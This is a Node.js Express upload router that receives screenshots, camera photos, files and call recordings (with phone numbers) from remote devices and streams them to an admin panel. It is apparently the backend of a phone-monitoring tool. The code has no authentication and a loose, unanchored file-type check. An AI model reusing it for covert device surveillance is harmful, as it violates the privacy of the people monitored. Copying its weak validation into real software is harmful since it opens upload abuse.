const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const prisma = require('../lib/db');
const { v4: uuidv4 } = require('uuid');

const router = express.Router();

// Ensure upload directories exist
const uploadDirs = ['screenshots', 'photos', 'files', 'recordings'];
uploadDirs.forEach(dir => {
    const fullPath = path.join(__dirname, '../../uploads', dir);
    if (!fs.existsSync(fullPath)) {
        fs.mkdirSync(fullPath, { recursive: true });
    }
});

// Multer storage configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.uploadType || 'files';
        cb(null, path.join(__dirname, '../../uploads', type));
    },
    filename: (req, file, cb) => {
        const uniqueName = `${Date.now()}-${uuidv4()}${path.extname(file.originalname)}`;
        cb(null, uniqueName);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 50 * 1024 * 1024 }, // 50MB limit
    fileFilter: (req, file, cb) => {
        // Accept images and common file types
        const allowedTypes = /jpeg|jpg|png|gif|webp|mp4|mp3|pdf|doc|docx|txt/;
        const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
        const mimetype = allowedTypes.test(file.mimetype);
        if (extname || mimetype) {
            cb(null, true);
        } else {
            cb(new Error('Invalid file type'));
        }
    }
});

// Separate multer config for large audio recordings (100MB limit)
const recordingUpload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 }, // 100MB limit for recordings
    fileFilter: (req, file, cb) => {
        // Accept audio file types
        const allowedTypes = /mp3|mp4|m4a|aac|wav|ogg|3gp|amr|audio/;
        const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
        const mimetype = allowedTypes.test(file.mimetype);
        if (extname || mimetype) {
            cb(null, true);
        } else {
            cb(new Error('Invalid audio file type'));
        }
    }
});

/**
 * Helper to find device by deviceId
 */
async function findDevice(deviceId) {
    return await prisma.device.findUnique({
        where: { deviceId }
    });
}

/**
 * POST /api/upload/screenshot
 * Upload screenshot from device
 */
router.post('/screenshot', (req, res, next) => {
    req.uploadType = 'screenshots';
    next();
}, upload.single('file'), async (req, res) => {
    try {
        const { deviceId } = req.body;

        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'Device ID required' });
        }

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        if (!req.file) {
            return res.status(400).json({ success: false, error: 'No file uploaded' });
        }

        // Read file and convert to base64
        const filePath = req.file.path;
        const fileBuffer = fs.readFileSync(filePath);
        const base64Data = fileBuffer.toString('base64');
        const mimeType = req.file.mimetype || 'image/jpeg';

        // Store in database
        const screenshot = await prisma.screenshot.create({
            data: {
                deviceId: device.id,
                data: base64Data,
                fileName: req.file.originalname || req.file.filename,
                fileSize: req.file.size,
                mimeType: mimeType
            }
        });

        // Delete the temp file since we stored in DB
        fs.unlinkSync(filePath);

        // Emit to admin panel with data URL
        const io = req.app.get('io');
        if (io) {
            io.to('admin').emit('screenshot:new', {
                deviceId,
                screenshot: {
                    id: screenshot.id,
                    url: `data:${mimeType};base64,${base64Data}`,
                    timestamp: screenshot.timestamp
                }
            });
        }

        console.log(`[UPLOAD] Screenshot from ${deviceId}: stored in DB (${req.file.size} bytes)`);
        res.json({
            success: true,
            id: screenshot.id
        });
    } catch (error) {
        console.error('[UPLOAD] Screenshot error:', error);
        res.status(500).json({ success: false, error: 'Failed to upload screenshot' });
    }
});

/**
 * POST /api/upload/photo
 * Upload photo from device camera
 */
router.post('/photo', (req, res, next) => {
    req.uploadType = 'photos';
    next();
}, upload.single('file'), async (req, res) => {
    try {
        const { deviceId, camera } = req.body;

        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'Device ID required' });
        }

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        if (!req.file) {
            return res.status(400).json({ success: false, error: 'No file uploaded' });
        }

        // Read file and convert to base64
        const filePath = req.file.path;
        const fileBuffer = fs.readFileSync(filePath);
        const base64Data = fileBuffer.toString('base64');
        const mimeType = req.file.mimetype || 'image/jpeg';

        // Store in database
        const photo = await prisma.photo.create({
            data: {
                deviceId: device.id,
                data: base64Data,
                fileName: req.file.originalname || req.file.filename,
                fileSize: req.file.size,
                mimeType: mimeType,
                camera: camera || 'back'
            }
        });

        // Delete the temp file since we stored in DB
        fs.unlinkSync(filePath);

        // Emit to admin panel with data URL
        const io = req.app.get('io');
        if (io) {
            io.to('admin').emit('photo:new', {
                deviceId,
                photo: {
                    id: photo.id,
                    url: `data:${mimeType};base64,${base64Data}`,
                    camera: photo.camera,
                    timestamp: photo.timestamp
                }
            });
        }

        console.log(`[UPLOAD] Photo (${camera}) from ${deviceId}: stored in DB (${req.file.size} bytes)`);
        res.json({
            success: true,
            id: photo.id
        });
    } catch (error) {
        console.error('[UPLOAD] Photo error:', error);
        res.status(500).json({ success: false, error: 'Failed to upload photo' });
    }
});

/**
 * POST /api/upload/file
 * Generic file upload from device
 */
router.post('/file', (req, res, next) => {
    req.uploadType = 'files';
    next();
}, upload.single('file'), async (req, res) => {
    try {
        const { deviceId } = req.body;

        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'Device ID required' });
        }

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        if (!req.file) {
            return res.status(400).json({ success: false, error: 'No file uploaded' });
        }

        console.log(`[UPLOAD] File from ${deviceId}: ${req.file.filename}`);
        res.json({
            success: true,
            url: `/uploads/files/${req.file.filename}`,
            filename: req.file.filename,
            size: req.file.size
        });
    } catch (error) {
        console.error('[UPLOAD] File error:', error);
        res.status(500).json({ success: false, error: 'Failed to upload file' });
    }
});

/**
 * POST /api/upload/recording
 * Upload call recording from device (multipart - streams file, no OOM)
 */
router.post('/recording', (req, res, next) => {
    req.uploadType = 'recordings';
    next();
}, recordingUpload.single('file'), async (req, res) => {
    try {
        const { deviceId, phoneNumber, callType, duration } = req.body;
        let { metadataId } = req.body;

        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'Device ID required' });
        }

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        if (!req.file) {
            return res.status(400).json({ success: false, error: 'No file uploaded' });
        }

        // Store absolute path for filesystem access, not URL path
        const filePath = req.file.path;
        const fileSize = req.file.size;

        // If metadataId is provided, update existing recording record
        if (metadataId) {
            try {
                await prisma.callRecording.update({
                    where: { id: metadataId },
                    data: {
                        filePath: filePath,
                        fileUrl: `/api/recordings/stream/${metadataId}`,
                        fileSize: fileSize,
                        status: 'uploaded',
                        uploadedAt: new Date()
                    }
                });
                console.log(`[UPLOAD] Recording updated: ${metadataId} -> ${filePath}`);
            } catch (err) {
                console.warn(`[UPLOAD] Could not update recording ${metadataId}:`, err.message);
            }
        } else {
            // Create new recording record
            try {
                const newRecording = await prisma.callRecording.create({
                    data: {
                        deviceId: device.id,
                        phoneNumber: phoneNumber || '',
                        callType: callType || 'unknown',
                        duration: parseInt(duration) || 0,
                        filePath: filePath,
                        fileSize: fileSize,
                        status: 'uploaded',
                        uploadedAt: new Date()
                    }
                });
                // Update with fileUrl now that we have the ID
                await prisma.callRecording.update({
                    where: { id: newRecording.id },
                    data: { fileUrl: `/api/recordings/stream/${newRecording.id}` }
                });
                console.log(`[UPLOAD] New recording created: ${newRecording.id} -> ${filePath}`);
                // Use this ID for socket emit
                metadataId = newRecording.id;
            } catch (err) {
                console.warn(`[UPLOAD] Could not create recording record:`, err.message);
            }
        }

        // Emit to admin panel - use 'recording:update' which the admin listens for
        const io = req.app.get('io');
        if (io) {
            io.emit('recording:update', {
                deviceId,
                recordingId: metadataId,
                status: 'uploaded'
            });
        }

        console.log(`[UPLOAD] Recording from ${deviceId}: ${req.file.filename} (${(fileSize / 1024 / 1024).toFixed(2)} MB)`);
        res.json({
            success: true,
            filePath: filePath,
            filename: req.file.filename,
            size: fileSize
        });
    } catch (error) {
        console.error('[UPLOAD] Recording error:', error);
        res.status(500).json({ success: false, error: 'Failed to upload recording' });
    }
});

module.exports = router;
